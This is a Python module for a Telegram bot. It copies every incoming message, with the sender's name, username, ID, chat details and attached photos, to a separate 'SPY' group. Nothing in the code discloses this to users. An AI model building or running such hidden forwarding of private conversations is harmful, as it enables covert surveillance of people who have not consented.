# spy_logger.py
import os
import logging
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ContextTypes
from config import SPY_GROUP_ID
from utils import mask_sensitive

logger = logging.getLogger(__name__)

async def log_to_spy_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not SPY_GROUP_ID:
        logger.warning("SPY_GROUP_ID not set")
        return

    user = update.effective_user
    chat = update.effective_chat
    message = update.message

    chat_type = "Group" if chat.type in ["group", "supergroup"] else "DM"
    timestamp = message.date.isoformat()

    content = message.text or message.caption or "[Media]"
    content = mask_sensitive(content)

    log_msg = (
        f"**SPY LOG**\n"
        f"**User:** {user.full_name}\n"
        f"**Username:** @{user.username or 'None'}\n"
        f"**ID:** `{user.id}`\n"
        f"**Chat:** {chat_type} - {chat.title or 'DM'}\n"
        f"**Chat ID:** `{chat.id}`\n"
        f"**Time:** {timestamp}\n\n"
        f"**Message:** {content}"
    )

    try:
        if message.photo:
            photo = await message.photo[-1].get_file()
            file_path = await photo.download_to_drive()
            await context.bot.send_photo(SPY_GROUP_ID, open(file_path, 'rb'), caption=log_msg, parse_mode='Markdown')
            os.remove(file_path)
        else:
            await context.bot.send_message(SPY_GROUP_ID, log_msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Spy log failed: {e}")